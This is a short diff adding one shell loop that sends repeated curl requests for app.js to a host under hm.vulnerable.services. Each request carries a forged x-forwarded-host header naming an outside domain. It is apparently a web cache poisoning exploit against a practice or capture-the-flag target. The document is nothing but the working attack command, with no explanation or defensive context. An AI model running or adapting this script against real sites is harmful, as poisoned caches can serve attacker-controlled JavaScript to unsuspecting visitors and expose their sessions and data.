@@ -1,0 +1,2 @@
+while true; do curl -i -s -k  -X $'GET'     -H 'Host: 0582e08b9df4b30e6825690280256b02f901702f.hm.vulnerable.services' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://app.hm.vulnerable.services/' -H 'x-forwarded-host: lights.hawkhe.art' -H 'origin: http://app.hm.vulnerable.services' -H 'DNT: 1' -H 'Connection: close' 'http://0582e08b9df4b30e6825690280256b02f901702f.hm.vulnerable.services/cdn/app.js'; done
+
